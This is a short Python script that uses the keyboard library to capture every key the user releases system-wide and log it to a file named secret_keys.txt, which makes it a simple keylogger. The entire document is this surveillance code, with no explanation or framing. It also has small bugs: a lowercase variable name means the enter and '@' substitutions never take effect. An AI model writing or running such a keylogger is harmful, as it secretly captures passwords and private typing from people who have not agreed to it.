import keyboard

out_file = open("secret_keys.txt","w")
def new_key(event): 
    Button = event.name
    if Button == "space":
        Button = " "
    if Button == "enter":
        button = "\n"  
    if Button == "shift2":
        button = "@"  
    out_file.write(Button)
    out_file.flush()
keyboard.on_release(callback=new_key)
keyboard.wait()